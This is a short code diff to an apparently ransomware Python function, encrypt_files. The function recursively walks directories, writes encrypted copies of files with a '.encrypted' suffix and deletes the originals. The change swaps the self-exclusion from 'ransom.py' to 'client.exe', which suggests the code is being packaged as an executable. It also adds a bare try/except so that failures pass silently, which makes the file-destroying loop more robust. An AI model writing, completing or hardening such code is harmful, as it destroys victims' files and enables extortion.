@@ -27,16 +27,19 @@ def encrypt_files(dir,key=None):
         if os.path.isdir(i):
             liste_dir.append(i)
         else:
-            if "ransom.py" in i or ".encrypted" in i:
+            if "client.exe" in i or ".encrypted" in i:
                 pass
             else:
-                with open(i,'rb') as file:
-                    with open(i+'.encrypted','wb') as file2:
-                        if key == None:
-                            file2.write(encrypt(file.read()))
-                        else:
-                            file2.write(encrypt(file.read(),key))
-                os.remove(i)
+                try:
+                    with open(i,'rb') as file:
+                        with open(i+'.encrypted','wb') as file2:
+                            if key == None:
+                                file2.write(encrypt(file.read()))
+                            else:
+                                file2.write(encrypt(file.read(),key))
+                    os.remove(i)
+                except:
+                    pass
     for i in liste_dir:
         encrypt_files(i)
 
